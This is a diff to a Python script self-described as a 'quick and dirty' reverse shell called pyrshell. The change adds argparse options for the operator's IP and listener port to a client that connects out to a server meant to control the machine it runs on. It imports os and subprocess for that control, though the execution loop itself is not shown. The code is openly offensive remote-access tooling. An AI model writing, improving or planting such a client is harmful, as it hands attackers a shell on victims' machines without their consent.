@@ -2,12 +2,26 @@ import socket
 # control operating system of target machine
 import os
 import subprocess
+import argparse
 
 s = socket.socket() # client computer can connect to others
 
 # ip address of server, can use own computer's private IP if doing on local
-host = str(input("Enter the IP address of the server that wants to control your computer: "))
-port = int(input("Enter the port of the server that wants to control your computer (default input: 9999): "))
+parser = argparse.ArgumentParser(
+        prog="pyrshell",
+        description="Quick and dirty python reverse shell",
+)
+parser.add_argument("-i", "--host", "--ip", help="your IP address", dest="host")
+parser.add_argument("-p", "--port", type=int, help="your listener port")
+args = parser.parse_args()
+
+host = args.host
+if host is None:
+        host = str(input("Enter the IP address of the server that wants to control your computer: "))
+
+port = args.port
+if port is None:
+        port = int(input("Enter the port of the server that wants to control your computer (default input: 9999): "))
 
 s.connect((host, port)) # binds client computer to server computer
 
